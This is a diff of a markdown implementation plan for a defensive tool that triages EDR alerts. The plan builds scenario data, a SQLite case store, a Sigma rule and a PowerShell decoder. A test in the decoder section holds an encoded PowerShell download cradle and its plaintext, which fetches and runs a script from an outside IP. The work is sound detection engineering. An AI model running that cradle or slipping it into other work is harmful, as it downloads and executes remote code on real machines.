@@ -1,14 +1,12 @@
-# Phase 1 — Case store, sandboxed tools, evidence ledger: Implementation Plan
+# Phase 1: Case store, sandboxed tools, evidence ledger: Implementation Plan
 
-> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.
+Goal: Build the boxed telemetry layer of `alert2attack`: normalized event/alert models, a SQLite `CaseStore` that can never contain gold labels, a registry of sandboxed tools that stamp every result with stable evidence ids into an `EvidenceLedger`, a small knowledge base (Sigma rule, ATT&CK techniques, PowerShell decoder), three authored scenarios, and a CLI to call any tool by hand.
 
-**Goal:** Build the boxed telemetry layer of `alert2attack`: normalized event/alert models, a SQLite `CaseStore` that can never contain gold labels, a registry of sandboxed tools that stamp every result with stable evidence ids into an `EvidenceLedger`, a small knowledge base (Sigma rule, ATT&CK techniques, PowerShell decoder), three authored scenarios, and a CLI to call any tool by hand.
+Architecture: `alert2attack.domain` (Pydantic models, no I/O) → `alert2attack.store.CaseStore` (only persistence) → `alert2attack.tools` (the only reader of the store during a run; every call is recorded in the ledger) → `alert2attack.cli` (Typer). `alert2attack.knowledge` is a sibling leaf used by the knowledge tools. Nothing in this phase talks to an LLM; Phase 3 binds `ToolRegistry.openai_schemas()` and `ToolRegistry.call()` to LangGraph without changing this layer.
 
-**Architecture:** `alert2attack.domain` (Pydantic models, no I/O) → `alert2attack.store.CaseStore` (only persistence) → `alert2attack.tools` (the only reader of the store during a run; every call is recorded in the ledger) → `alert2attack.cli` (Typer). `alert2attack.knowledge` is a sibling leaf used by the knowledge tools. Nothing in this phase talks to an LLM; Phase 3 binds `ToolRegistry.openai_schemas()` and `ToolRegistry.call()` to LangGraph without changing this layer.
+Tech Stack: Python 3.12, `uv`, `src/` layout, Pydantic v2, stdlib `sqlite3`, PyYAML, Typer, pytest, ruff, mypy.
 
-**Tech Stack:** Python 3.12, `uv`, `src/` layout, Pydantic v2, stdlib `sqlite3`, PyYAML, Typer, pytest, ruff, mypy.
-
-**Verification status:** every code block in this plan was extracted into a scratch tree and run on 2026-09-09: 83 tests pass, `ruff check` clean, `mypy --strict` clean, CLI smoke-tested. Implementers should still follow the red → green steps; the point is that the target state is known to be reachable.
+Verification status: every code block in this plan was extracted into a scratch tree and run on 2026-09-09: 83 tests pass, `ruff check` clean, `mypy --strict` clean, CLI smoke-tested. Implementers should still follow the red → green steps; the point is that the target state is known to be reachable.
 
 ## Global Constraints
 
@@ -21,8 +19,6 @@
 - Gold never enters `CaseStore`. Only `alert2attack.tools` reads `CaseStore` during a run.
 - Tool results never raise into the caller; errors are data (`ToolResult.ok == False`).
 - Timestamps are timezone-aware; stored as UTC ISO-8601 strings.
-
----
 
 ## File structure
 
@@ -48,21 +44,19 @@
 | `datasets/scenarios/<id>/manifest.yaml`, `events.jsonl` | Authored scenarios |
 | `tests/…` | Mirrors `src/` |
 
----
-
 ### Task 1: Project scaffold
 
-**Files:**
+Files:
 - Create: `pyproject.toml`, `.gitignore`, `src/alert2attack/__init__.py`, `tests/test_smoke.py`
 
-**Interfaces:**
+Interfaces:
 - Produces: importable package `alert2attack` with `__version__`.
 
-- [ ] **Step 1: Install uv if missing**
+- [ ] Step 1: Install uv if missing
 
 Run: `command -v uv || curl -LsSf https://astral.sh/uv/install.sh | sh` then `export PATH="$HOME/.local/bin:$PATH"`.
 
-- [ ] **Step 2: Write `pyproject.toml`**
+- [ ] Step 2: Write `pyproject.toml`
 
 ```toml
 [project]
@@ -114,7 +108,7 @@ packages = ["alert2attack"]
 mypy_path = "src"
 ```
 
-- [ ] **Step 3: Write `.gitignore`**
+- [ ] Step 3: Write `.gitignore`
 
 ```gitignore
 .venv/
@@ -129,7 +123,7 @@ reports/
 datasets/raw/
 ```
 
-- [ ] **Step 4: Write `src/alert2attack/__init__.py`**
+- [ ] Step 4: Write `src/alert2attack/__init__.py`
 
 ```python
 """alert2attack: sourced case files from EDR alerts."""
@@ -137,48 +131,45 @@ datasets/raw/
 __version__ = "0.1.0"
 ```
 
-- [ ] **Step 5: Write the smoke test `tests/test_smoke.py`**
+- [ ] Step 5: Write the smoke test `tests/test_smoke.py`
 
 ```python
 import alert2attack
-
 
 def test_version_is_exposed() -> None:
     assert alert2attack.__version__ == "0.1.0"
 ```
 
-- [ ] **Step 6: Sync and run**
+- [ ] Step 6: Sync and run
 
 Run: `uv sync && uv run pytest`
 Expected: `1 passed`
 
-- [ ] **Step 7: Lint gate**
+- [ ] Step 7: Lint gate
 
 Run: `uv run ruff check . && uv run mypy`
 Expected: `All checks passed!` and `Success: no issues found`
 
-- [ ] **Step 8: Commit**
+- [ ] Step 8: Commit
 
 ```bash
 git add pyproject.toml .gitignore src/alert2attack/__init__.py tests/test_smoke.py uv.lock
 git commit -m "chore: scaffold alert2attack package with uv, pytest, ruff, mypy"
 ```
 
----
+### Task 2: Domain models: evidence ids, events, alert
 
-### Task 2: Domain models — evidence ids, events, alert
-
-**Files:**
+Files:
 - Create: `src/alert2attack/domain/__init__.py`, `src/alert2attack/domain/evidence.py`, `src/alert2attack/domain/events.py`, `src/alert2attack/domain/alert.py`
 - Test: `tests/domain/test_evidence.py`, `tests/domain/test_events.py`, `tests/domain/test_alert.py`
 
-**Interfaces:**
+Interfaces:
 - Produces:
   - `EvidenceId` (Annotated str), `EVIDENCE_ID_PATTERN: str`, `is_evidence_id(str) -> bool`, `rule_evidence_id(slug: str) -> str`, `technique_evidence_id(technique_id: str) -> str`
   - `EventKind(StrEnum)` with 9 members, `Event(BaseModel, frozen)` with `event_id`, `kind`, `ts`, `host`, and optional telemetry fields; `Event.search_text() -> str`
   - `Severity(StrEnum)`, `Alert(BaseModel, frozen)`
 
-- [ ] **Step 1: Write failing tests**
+- [ ] Step 1: Write failing tests
 
 `tests/domain/__init__.py`: empty file.
 
@@ -195,14 +186,12 @@ from alert2attack.domain.evidence import (
     technique_evidence_id,
 )
 
-
 @pytest.mark.parametrize(
     "value",
     ["ev-0001", "ev-123456", "rule-win_powershell_encoded_command", "attack-T1059", "attack-T1059.001"],
 )
 def test_valid_ids(value: str) -> None:
     assert is_evidence_id(value)
-
 
 @pytest.mark.parametrize(
     "value",
@@ -211,11 +200,9 @@ def test_valid_ids(value: str) -> None:
 def test_invalid_ids(value: str) -> None:
     assert not is_evidence_id(value)
 
-
 def test_constructors() -> None:
     assert rule_evidence_id("win_powershell_encoded_command") == "rule-win_powershell_encoded_command"
     assert technique_evidence_id("T1059.001") == "attack-T1059.001"
-
 
 def test_evidence_id_type_validates_in_models() -> None:
     class M(BaseModel):
@@ -236,7 +223,6 @@ from pydantic import ValidationError
 
 from alert2attack.domain.events import Event, EventKind
 
-
 def _proc(**over: object) -> Event:
     base: dict[str, object] = {
         "event_id": "ev-0004",
@@ -254,17 +240,14 @@ def _proc(**over: object) -> Event:
     base.update(over)
     return Event.model_validate(base)
 
-
 def test_parses_and_normalises_timestamp_to_utc() -> None:
     e = _proc()
     assert e.ts == datetime(2024, 3, 12, 10, 2, 14, tzinfo=UTC)
     assert e.ts.tzinfo is not None
 
-
 def test_rejects_naive_timestamp() -> None:
     with pytest.raises(ValidationError):
         _proc(ts="2024-03-12T10:02:14")
-
 
 def test_rejects_unknown_field_and_bad_id() -> None:
     with pytest.raises(ValidationError):
@@ -272,12 +255,10 @@ def test_rejects_unknown_field_and_bad_id() -> None:
     with pytest.raises(ValidationError):
         _proc(event_id="4")
 
-
 def test_is_frozen() -> None:
     e = _proc()
     with pytest.raises(ValidationError):
         e.pid = 1  # type: ignore[misc]
-
 
 def test_search_text_is_lowercase_concatenation_of_searchable_fields() -> None:
     e = _proc()
@@ -286,7 +267,6 @@ def test_search_text_is_lowercase_concatenation_of_searchable_fields() -> None:
     assert "-enc aaaa" in text
     assert "corp\\jdoe" in text
     assert text == text.lower()
-
 
 def test_all_nine_kinds_exist() -> None:
     assert {k.value for k in EventKind} == {
@@ -310,7 +290,6 @@ from pydantic import ValidationError
 
 from alert2attack.domain.alert import Alert, Severity
 
-
 def test_alert_roundtrip() -> None:
     a = Alert.model_validate(
         {
@@ -326,7 +305,6 @@ def test_alert_roundtrip() -> None:
     assert a.severity is Severity.HIGH
     assert a.model_dump(mode="json")["fired_at"] == "2024-03-12T10:02:14Z"
 
-
 def test_alert_requires_valid_trigger_id() -> None:
     with pytest.raises(ValidationError):
         Alert(
@@ -340,18 +318,18 @@ def test_alert_requires_valid_trigger_id() -> None:
         )
 ```
 
-- [ ] **Step 2: Run tests to verify they fail**
+- [ ] Step 2: Run tests to verify they fail
 
 Run: `uv run pytest tests/domain -q`
 Expected: `ModuleNotFoundError: No module named 'alert2attack.domain'`
 
-- [ ] **Step 3: Write `src/alert2attack/domain/__init__.py`**
+- [ ] Step 3: Write `src/alert2attack/domain/__init__.py`
 
 ```python
 """Domain models. No I/O lives here."""
 ```
 
-- [ ] **Step 4: Write `src/alert2attack/domain/evidence.py`**
+- [ ] Step 4: Write `src/alert2attack/domain/evidence.py`
 
 ```python
 """Evidence id grammar.
@@ -374,20 +352,17 @@ _EVIDENCE_ID_RE = re.compile(EVIDENCE_ID_PATTERN)
 
 EvidenceId = Annotated[str, StringConstraints(pattern=EVIDENCE_ID_PATTERN)]
 
-
 def is_evidence_id(value: str) -> bool:
     return _EVIDENCE_ID_RE.match(value) is not None
 
-
 def rule_evidence_id(slug: str) -> str:
     return f"rule-{slug}"
-
 
 def technique_evidence_id(technique_id: str) -> str:
     return f"attack-{technique_id}"
 ```
 
-- [ ] **Step 5: Write `src/alert2attack/domain/events.py`**
+- [ ] Step 5: Write `src/alert2attack/domain/events.py`
 
 ```python
 from datetime import UTC, datetime
@@ -396,7 +371,6 @@ from enum import StrEnum
 from pydantic import BaseModel, ConfigDict, field_validator
 
 from alert2attack.domain.evidence import EvidenceId
-
 
 class EventKind(StrEnum):
     PROCESS_CREATE = "process_create"  # Sysmon 1
@@ -409,12 +383,10 @@ class EventKind(StrEnum):
     SERVICE_INSTALL = "service_install"  # System 7045
     SCHEDULED_TASK = "scheduled_task"  # Security 4698
 
-
 def ensure_utc(value: datetime) -> datetime:
     if value.tzinfo is None:
         raise ValueError("timestamp must be timezone-aware")
     return value.astimezone(UTC)
-
 
 class Event(BaseModel):
     """One normalized telemetry event. Flat on purpose: it is rendered to an LLM as-is."""
@@ -467,7 +439,7 @@ class Event(BaseModel):
         return " ".join(p for p in parts if p).lower()
 ```
 
-- [ ] **Step 6: Write `src/alert2attack/domain/alert.py`**
+- [ ] Step 6: Write `src/alert2attack/domain/alert.py`
 
 ```python
 from datetime import datetime
@@ -478,13 +450,11 @@ from pydantic import BaseModel, ConfigDict, field_validator
 from alert2attack.domain.events import ensure_utc
 from alert2attack.domain.evidence import EvidenceId
 
-
 class Severity(StrEnum):
     LOW = "low"
     MEDIUM = "medium"
     HIGH = "high"
     CRITICAL = "critical"
-
 
 class Alert(BaseModel):
     """What the EDR shows the analyst when the case opens."""
@@ -505,12 +475,12 @@ class Alert(BaseModel):
         return ensure_utc(value)
 ```
 
-- [ ] **Step 7: Run tests**
+- [ ] Step 7: Run tests
 
 Run: `uv run pytest tests/domain -q`
 Expected: all pass (23 tests).
 
-- [ ] **Step 8: Lint and commit**
+- [ ] Step 8: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -518,19 +488,17 @@ git add src/alert2attack/domain tests/domain
 git commit -m "feat(domain): evidence id grammar, Event, Alert models"
 ```
 
----
-
 ### Task 3: Scenario model and loader, first authored scenario
 
-**Files:**
+Files:
 - Create: `src/alert2attack/domain/scenario.py`, `datasets/scenarios/enc_ps_downloader_001/manifest.yaml`, `datasets/scenarios/enc_ps_downloader_001/events.jsonl`
 - Test: `tests/domain/test_scenario.py`, `tests/conftest.py`
 
-**Interfaces:**
+Interfaces:
 - Consumes: `Event`, `Alert`, `EvidenceId`.
 - Produces: `Window(start, end)`, `Gold`, `Scenario` with `.public() -> Scenario`, `load_scenario(path: Path) -> Scenario`, `iter_scenarios(root: Path) -> Iterator[Scenario]`, `SCENARIOS_ROOT: Path` (repo `datasets/scenarios`).
 
-- [ ] **Step 1: Write the scenario fixture files**
+- [ ] Step 1: Write the scenario fixture files
 
 `datasets/scenarios/enc_ps_downloader_001/manifest.yaml`:
 
@@ -587,7 +555,7 @@ gold:
 {"event_id":"ev-0012","kind":"process_create","ts":"2024-03-12T10:09:47Z","host":"WS-FIN-07","user":"CORP\\jdoe","pid":6100,"ppid":1180,"image":"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe","command_line":"\"C:\\Users\\jdoe\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background","parent_image":"C:\\Windows\\explorer.exe","source_event_code":1}
 ```
 
-- [ ] **Step 2: Write failing tests**
+- [ ] Step 2: Write failing tests
 
 `tests/conftest.py`:
 
@@ -600,11 +568,9 @@ from alert2attack.domain.scenario import SCENARIOS_ROOT, Scenario, load_scenario
 
 DOWNLOADER = SCENARIOS_ROOT / "enc_ps_downloader_001"
 
-
 @pytest.fixture
 def downloader_scenario() -> Scenario:
     return load_scenario(DOWNLOADER)
-
 
 @pytest.fixture
 def scenario_dir(tmp_path: Path) -> Path:
@@ -666,7 +632,6 @@ from pydantic import ValidationError
 
 from alert2attack.domain.scenario import SCENARIOS_ROOT, Scenario, iter_scenarios, load_scenario
 
-
 def test_loads_authored_downloader(downloader_scenario: Scenario) -> None:
     s = downloader_scenario
     assert s.scenario_id == "enc_ps_downloader_001"
@@ -675,20 +640,17 @@ def test_loads_authored_downloader(downloader_scenario: Scenario) -> None:
     assert s.gold is not None and s.gold.verdict == "malicious"
     assert s.events == sorted(s.events, key=lambda e: e.ts)
 
-
 def test_public_strips_gold(downloader_scenario: Scenario) -> None:
     pub = downloader_scenario.public()
     assert pub.gold is None
     assert pub.events == downloader_scenario.events
     assert downloader_scenario.gold is not None  # original untouched
 
-
 def test_trigger_event_must_exist(scenario_dir: Path) -> None:
     manifest = scenario_dir / "manifest.yaml"
     manifest.write_text(manifest.read_text().replace("trigger_event_id: ev-0002", "trigger_event_id: ev-0099"))
     with pytest.raises(ValidationError, match="trigger_event_id"):
         load_scenario(scenario_dir)
-
 
 def test_duplicate_event_ids_rejected(scenario_dir: Path) -> None:
     events = scenario_dir / "events.jsonl"
@@ -697,13 +659,11 @@ def test_duplicate_event_ids_rejected(scenario_dir: Path) -> None:
     with pytest.raises(ValidationError, match="duplicate"):
         load_scenario(scenario_dir)
 
-
 def test_window_end_after_start(scenario_dir: Path) -> None:
     manifest = scenario_dir / "manifest.yaml"
     manifest.write_text(manifest.read_text().replace("end: 2024-01-01T01:00:00Z", "end: 2023-12-31T23:00:00Z"))
     with pytest.raises(ValidationError, match="window"):
         load_scenario(scenario_dir)
-
 
 def test_iter_scenarios_finds_every_committed_scenario() -> None:
     ids = sorted(s.scenario_id for s in iter_scenarios(SCENARIOS_ROOT))
@@ -711,12 +671,12 @@ def test_iter_scenarios_finds_every_committed_scenario() -> None:
     assert ids == sorted(set(ids))
 ```
 
-- [ ] **Step 3: Run tests to verify they fail**
+- [ ] Step 3: Run tests to verify they fail
 
 Run: `uv run pytest tests/domain/test_scenario.py -q`
 Expected: `ModuleNotFoundError: No module named 'alert2attack.domain.scenario'`
 
-- [ ] **Step 4: Write `src/alert2attack/domain/scenario.py`**
+- [ ] Step 4: Write `src/alert2attack/domain/scenario.py`
 
 ```python
 import json
@@ -733,7 +693,6 @@ from alert2attack.domain.events import Event, ensure_utc
 from alert2attack.domain.evidence import EvidenceId
 
 SCENARIOS_ROOT = Path(__file__).resolve().parents[3] / "datasets" / "scenarios"
-
 
 class Window(BaseModel):
     model_config = ConfigDict(frozen=True, extra="forbid")
@@ -755,7 +714,6 @@ class Window(BaseModel):
     def contains(self, ts: datetime) -> bool:
         return self.start <= ts <= self.end
 
-
 class Gold(BaseModel):
     """Held-out answer. Read only by the evaluator, never by tools or the agent."""
 
@@ -769,7 +727,6 @@ class Gold(BaseModel):
     acceptable_actions: list[str] = Field(default_factory=list)
     unacceptable_actions: list[str] = Field(default_factory=list)
     narrative: str
-
 
 class Scenario(BaseModel):
     model_config = ConfigDict(frozen=True, extra="forbid")
@@ -796,7 +753,6 @@ class Scenario(BaseModel):
         """The view a tool or agent is allowed to see."""
         return self.model_copy(update={"gold": None})
 
-
 def load_scenario(path: Path) -> Scenario:
     manifest = yaml.safe_load((path / "manifest.yaml").read_text(encoding="utf-8"))
     raw_events = [
@@ -807,18 +763,17 @@ def load_scenario(path: Path) -> Scenario:
     events = sorted((Event.model_validate(r) for r in raw_events), key=lambda e: e.ts)
     return Scenario.model_validate({**manifest, "events": events})
 
-
 def iter_scenarios(root: Path) -> Iterator[Scenario]:
     for manifest in sorted(root.glob("*/manifest.yaml")):
         yield load_scenario(manifest.parent)
 ```
 
-- [ ] **Step 5: Run tests**
+- [ ] Step 5: Run tests
 
 Run: `uv run pytest tests/domain -q`
 Expected: all pass.
 
-- [ ] **Step 6: Lint and commit**
+- [ ] Step 6: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -826,15 +781,13 @@ git add src/alert2attack/domain/scenario.py datasets/scenarios/enc_ps_downloader
 git commit -m "feat(domain): Scenario/Gold/Window models, loader, first authored scenario"
 ```
 
----
-
 ### Task 4: `CaseStore` (SQLite), gold can never enter
 
-**Files:**
+Files:
 - Create: `src/alert2attack/store/__init__.py`, `src/alert2attack/store/case_store.py`
 - Test: `tests/store/__init__.py`, `tests/store/test_case_store.py`
 
-**Interfaces:**
+Interfaces:
 - Consumes: `Scenario`, `Event`, `EventKind`, `Alert`.
 - Produces:
   - `class CaseNotFound(KeyError)`
@@ -852,7 +805,7 @@ git commit -m "feat(domain): Scenario/Gold/Window models, loader, first authored
     - `dump_text(self) -> str` (everything stored, for the no-gold test)
     - `close(self) -> None`
 
-- [ ] **Step 1: Write failing tests**
+- [ ] Step 1: Write failing tests
 
 `tests/store/__init__.py`: empty.
 
@@ -868,21 +821,17 @@ from alert2attack.domain.events import EventKind
 from alert2attack.domain.scenario import Scenario, load_scenario
 from alert2attack.store.case_store import CaseNotFound, CaseStore
 
-
 @pytest.fixture
 def store(downloader_scenario: Scenario) -> CaseStore:
     s = CaseStore()
     s.load_case(downloader_scenario.public())
     return s
 
-
 CASE = "enc_ps_downloader_001"
-
 
 def test_refuses_gold(downloader_scenario: Scenario) -> None:
     with pytest.raises(ValueError, match="gold"):
         CaseStore().load_case(downloader_scenario)
-
 
 def test_store_contains_no_gold_text(downloader_scenario: Scenario, tmp_path: Path) -> None:
     db = tmp_path / "case.sqlite"
@@ -891,10 +840,8 @@ def test_store_contains_no_gold_text(downloader_scenario: Scenario, tmp_path: Pa
     assert "GOLD-MARKER" not in s.dump_text()
     assert "GOLD-MARKER" not in db.read_bytes().decode("latin-1")
 
-
 def test_load_report_and_case_ids(store: CaseStore) -> None:
     assert store.case_ids() == [CASE]
-
 
 def test_drops_out_of_window_and_other_host(scenario_dir: Path) -> None:
     sc = load_scenario(scenario_dir).public()
@@ -903,7 +850,6 @@ def test_drops_out_of_window_and_other_host(scenario_dir: Path) -> None:
     assert report.dropped_out_of_window == 1
     assert report.dropped_other_host == 1
 
-
 def test_alert_and_window(store: CaseStore) -> None:
     alert = store.get_alert(CASE)
     assert alert.trigger_event_id == "ev-0004"
@@ -911,17 +857,14 @@ def test_alert_and_window(store: CaseStore) -> None:
     assert start == datetime(2024, 3, 12, 9, 55, tzinfo=UTC)
     assert end == datetime(2024, 3, 12, 10, 25, tzinfo=UTC)
 
-
 def test_unknown_case_raises(store: CaseStore) -> None:
     with pytest.raises(CaseNotFound):
         store.get_alert("nope")
-
 
 def test_get_event_roundtrips_full_model(store: CaseStore, downloader_scenario: Scenario) -> None:
     original = next(e for e in downloader_scenario.events if e.event_id == "ev-0004")
     assert store.get_event(CASE, "ev-0004") == original
     assert store.get_event(CASE, "ev-9999") is None
-
 
 def test_find_process_and_children(store: CaseStore) -> None:
     ps = store.find_process(CASE, 5288)
@@ -929,7 +872,6 @@ def test_find_process_and_children(store: CaseStore) -> None:
     assert store.find_process(CASE, 424242) is None
     kids = store.children(CASE, 5288)
     assert [k.pid for k in kids] == [5304]
-
 
 def test_query_by_kind_pid_and_time(store: CaseStore) -> None:
     net = store.query_events(CASE, kinds=[EventKind.NETWORK_CONNECT])
@@ -941,14 +883,12 @@ def test_query_by_kind_pid_and_time(store: CaseStore) -> None:
     early = store.query_events(CASE, until=datetime(2024, 3, 12, 9, 58, tzinfo=UTC))
     assert [e.event_id for e in early] == ["ev-0001", "ev-0002"]
 
-
 def test_query_contains_is_case_insensitive_and_escapes_like(store: CaseStore) -> None:
     hits = store.query_events(CASE, contains="INVOICE_Q1")
     assert {e.event_id for e in hits} == {"ev-0003", "ev-0004"}
     assert store.query_events(CASE, contains="%") == []
     assert store.query_events(CASE, contains="_") != []  # literal underscore in Invoice_Q1
     assert store.query_events(CASE, contains="185.220.101.4") != []
-
 
 def test_query_pagination(store: CaseStore) -> None:
     page1 = store.query_events(CASE, limit=5)
@@ -958,12 +898,12 @@ def test_query_pagination(store: CaseStore) -> None:
     assert ids == [f"ev-{i:04d}" for i in range(1, 13)]
 ```
 
-- [ ] **Step 2: Run tests to verify they fail**
+- [ ] Step 2: Run tests to verify they fail
 
 Run: `uv run pytest tests/store -q`
 Expected: `ModuleNotFoundError: No module named 'alert2attack.store'`
 
-- [ ] **Step 3: Write `src/alert2attack/store/__init__.py`**
+- [ ] Step 3: Write `src/alert2attack/store/__init__.py`
 
 ```python
 from alert2attack.store.case_store import CaseNotFound, CaseStore, LoadReport
@@ -971,7 +911,7 @@ from alert2attack.store.case_store import CaseNotFound, CaseStore, LoadReport
 __all__ = ["CaseNotFound", "CaseStore", "LoadReport"]
 ```
 
-- [ ] **Step 4: Write `src/alert2attack/store/case_store.py`**
+- [ ] Step 4: Write `src/alert2attack/store/case_store.py`
 
 ```python
 """SQLite-backed case store.
@@ -1016,25 +956,20 @@ CREATE INDEX IF NOT EXISTS ix_events_ppid ON events(case_id, ppid);
 CREATE INDEX IF NOT EXISTS ix_events_kind_ts ON events(case_id, kind, ts);
 """
 
-
 def _iso(ts: datetime) -> str:
     return ts.astimezone(UTC).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
-
 
 def _escape_like(term: str) -> str:
     return term.replace("\\", "\\\\").replace("%", "\\%").replace("_", "\\_")
 
-
 class CaseNotFound(KeyError):
     pass
-
 
 class LoadReport(BaseModel):
     case_id: str
     loaded: int
     dropped_out_of_window: int
     dropped_other_host: int
-
 
 class CaseStore:
     def __init__(self, path: str | Path = ":memory:") -> None:
@@ -1182,12 +1117,12 @@ class CaseStore:
         return "\n".join(parts)
 ```
 
-- [ ] **Step 5: Run tests**
+- [ ] Step 5: Run tests
 
 Run: `uv run pytest tests/store -q`
 Expected: all pass (11 tests).
 
-- [ ] **Step 6: Lint and commit**
+- [ ] Step 6: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -1195,22 +1130,20 @@ git add src/alert2attack/store tests/store
 git commit -m "feat(store): SQLite CaseStore with boxed loading and scoped queries; gold rejected"
 ```
 
----
+### Task 5: Knowledge base: Sigma rule, ATT&CK subset, PowerShell decoder
 
-### Task 5: Knowledge base — Sigma rule, ATT&CK subset, PowerShell decoder
-
-**Files:**
+Files:
 - Create: `src/alert2attack/knowledge/__init__.py`, `src/alert2attack/knowledge/base.py`, `src/alert2attack/knowledge/powershell.py`, `src/alert2attack/knowledge/data/sigma/win_powershell_encoded_command.yaml`, `src/alert2attack/knowledge/data/attack_techniques.json`, `src/alert2attack/knowledge/data/ATTRIBUTION.md`
 - Test: `tests/knowledge/__init__.py`, `tests/knowledge/test_powershell.py`, `tests/knowledge/test_base.py`
 
-**Interfaces:**
+Interfaces:
 - Produces:
   - `SigmaRule(BaseModel)`: `slug`, `title`, `description`, `level`, `tags: list[str]`, `falsepositives: list[str]`, `references: list[str]`, `detection: dict[str, Any]`; property `attack_technique_ids -> list[str]`
   - `AttackTechnique(BaseModel)`: `technique_id`, `name`, `tactics: list[str]`, `description`
   - `KnowledgeBase`: `load_default() -> KnowledgeBase`, `rule(slug) -> SigmaRule | None`, `technique(technique_id) -> AttackTechnique | None`, `rule_slugs() -> list[str]`, `technique_ids() -> list[str]`
   - `DecodeResult(BaseModel)`: `encoded: bool`, `decoded: str | None`, `error: str | None`; `decode_powershell(command_line: str) -> DecodeResult`
 
-- [ ] **Step 1: Write failing tests**
+- [ ] Step 1: Write failing tests
 
 `tests/knowledge/__init__.py`: empty.
 
@@ -1228,7 +1161,6 @@ B64 = (
 )
 PLAIN = "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.4/a.ps1')"
 
-
 @pytest.mark.parametrize("flag", ["-enc", "-Enc", "-EncodedCommand", "-e", "-ec", "/enc"])
 def test_decodes_common_flag_spellings(flag: str) -> None:
     r = decode_powershell(f"powershell.exe -NoP -W Hidden {flag} {B64}")
@@ -1236,16 +1168,13 @@ def test_decodes_common_flag_spellings(flag: str) -> None:
     assert r.decoded == PLAIN
     assert r.error is None
 
-
 def test_not_encoded() -> None:
     r = decode_powershell("powershell.exe -NoProfile -File C:\\scripts\\backup.ps1")
     assert r.encoded is False and r.decoded is None and r.error is None
 
-
 def test_bad_base64_reports_error_not_exception() -> None:
     r = decode_powershell("powershell -enc !!!notbase64!!!")
     assert r.encoded is True and r.decoded is None and r.error is not None
-
 
 def test_does_not_confuse_execution_policy_flag() -> None:
     r = decode_powershell("powershell.exe -ExecutionPolicy Bypass -File a.ps1")
@@ -1256,7 +1185,6 @@ def test_does_not_confuse_execution_policy_flag() -> None:
 
 ```python
 from alert2attack.knowledge.base import KnowledgeBase
-
 
 def test_default_knowledge_base_loads_rule_and_techniques() -> None:
     kb = KnowledgeBase.load_default()
@@ -1275,12 +1203,12 @@ def test_default_knowledge_base_loads_rule_and_techniques() -> None:
     assert {"T1059.001", "T1547.001", "T1105", "T1003.001"} <= set(kb.technique_ids())
 ```
 
-- [ ] **Step 2: Run tests to verify they fail**
+- [ ] Step 2: Run tests to verify they fail
 
 Run: `uv run pytest tests/knowledge -q`
 Expected: `ModuleNotFoundError: No module named 'alert2attack.knowledge'`
 
-- [ ] **Step 3: Write the data files**
+- [ ] Step 3: Write the data files
 
 `src/alert2attack/knowledge/data/ATTRIBUTION.md`:
 
@@ -1367,7 +1295,7 @@ level: high
 ]
 ```
 
-- [ ] **Step 4: Write `src/alert2attack/knowledge/__init__.py`**
+- [ ] Step 4: Write `src/alert2attack/knowledge/__init__.py`
 
 ```python
 from alert2attack.knowledge.base import AttackTechnique, KnowledgeBase, SigmaRule
@@ -1376,7 +1304,7 @@ from alert2attack.knowledge.powershell import DecodeResult, decode_powershell
 __all__ = ["AttackTechnique", "DecodeResult", "KnowledgeBase", "SigmaRule", "decode_powershell"]
 ```
 
-- [ ] **Step 5: Write `src/alert2attack/knowledge/powershell.py`**
+- [ ] Step 5: Write `src/alert2attack/knowledge/powershell.py`
 
 ```python
 """Deterministic PowerShell -EncodedCommand decoder. No LLM involved."""
@@ -1396,12 +1324,10 @@ _ENC_FLAG_RE = re.compile(
     re.IGNORECASE,
 )
 
-
 class DecodeResult(BaseModel):
     encoded: bool
     decoded: str | None = None
     error: str | None = None
-
 
 def decode_powershell(command_line: str) -> DecodeResult:
     m = _ENC_FLAG_RE.search(command_line)
@@ -1415,7 +1341,7 @@ def decode_powershell(command_line: str) -> DecodeResult:
         return DecodeResult(encoded=True, error=f"could not decode payload: {exc}")
 ```
 
-- [ ] **Step 6: Write `src/alert2attack/knowledge/base.py`**
+- [ ] Step 6: Write `src/alert2attack/knowledge/base.py`
 
 ```python
 import json
@@ -1426,7 +1352,6 @@ import yaml
 from pydantic import BaseModel, ConfigDict, Field
 
 DATA_DIR = Path(__file__).resolve().parent / "data"
-
 
 class SigmaRule(BaseModel):
     model_config = ConfigDict(frozen=True, extra="ignore")
@@ -1448,7 +1373,6 @@ class SigmaRule(BaseModel):
                 ids.append(tag.split(".", 1)[1].upper())
         return ids
 
-
 class AttackTechnique(BaseModel):
     model_config = ConfigDict(frozen=True, extra="forbid")
 
@@ -1456,7 +1380,6 @@ class AttackTechnique(BaseModel):
     name: str
     tactics: list[str]
     description: str
-
 
 class KnowledgeBase:
     def __init__(self, rules: dict[str, SigmaRule], techniques: dict[str, AttackTechnique]) -> None:
@@ -1492,12 +1415,12 @@ class KnowledgeBase:
         return sorted(self._techniques)
 ```
 
-- [ ] **Step 7: Run tests**
+- [ ] Step 7: Run tests
 
 Run: `uv run pytest tests/knowledge -q`
 Expected: all pass (10 tests).
 
-- [ ] **Step 8: Lint and commit**
+- [ ] Step 8: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -1505,15 +1428,13 @@ git add src/alert2attack/knowledge tests/knowledge
 git commit -m "feat(knowledge): vendored Sigma rule, ATT&CK subset, PowerShell decoder"
 ```
 
----
-
 ### Task 6: Tool context, evidence ledger, registry
 
-**Files:**
+Files:
 - Create: `src/alert2attack/tools/context.py`, `src/alert2attack/tools/registry.py`
 - Test: `tests/tools/__init__.py`, `tests/tools/test_registry.py`
 
-**Interfaces:**
+Interfaces:
 - Consumes: `CaseStore`, `KnowledgeBase`.
 - Produces:
   - `ToolResult(BaseModel)`: `ok: bool = True`, `data: Any = None`, `evidence_ids: list[str] = []`, `truncated: bool = False`, `error: str | None = None`; classmethod `fail(message: str) -> ToolResult`
@@ -1524,7 +1445,7 @@ git commit -m "feat(knowledge): vendored Sigma rule, ATT&CK subset, PowerShell d
   - `ToolSpec` (dataclass): `name`, `description`, `args_model: type[BaseModel]`, `fn: ToolFn`
